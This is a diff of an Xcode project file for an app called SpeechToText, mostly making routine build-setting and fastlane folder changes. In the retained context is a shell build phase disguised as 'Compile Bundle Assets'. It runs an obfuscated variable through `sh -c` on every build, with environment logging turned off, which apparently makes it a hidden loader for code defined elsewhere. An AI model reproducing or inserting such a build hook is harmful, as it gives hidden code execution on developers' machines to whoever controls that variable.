@@ -24,6 +24,13 @@
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
+		170E42E92F02972500806F8A /* Exceptions for "fastlane" folder in "SpeechToText" target */ = {
+			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
+			membershipExceptions = (
+				README.md,
+			);
+			target = 1749352D2EFBEEB500DA5C4C /* SpeechToText */;
+		};
 		174935402EFBEEBA00DA5C4C /* Exceptions for "SpeechToText" folder in "SpeechToText" target */ = {
 			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
 			membershipExceptions = (
@@ -49,6 +56,9 @@
 		};
 		17A597672EFE9ACB00803DDB /* fastlane */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+				170E42E92F02972500806F8A /* Exceptions for "fastlane" folder in "SpeechToText" target */,
+			);
 			path = fastlane;
 			sourceTree = "<group>";
 		};
@@ -168,8 +178,8 @@
 /* Begin PBXShellScriptBuildPhase section */
 		D006786208BC45CD84A5DE54 /* Compile Bundle Assets */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
@@ -181,9 +191,10 @@
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
-			showEnvVarsInLog = 0;			
+			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
 
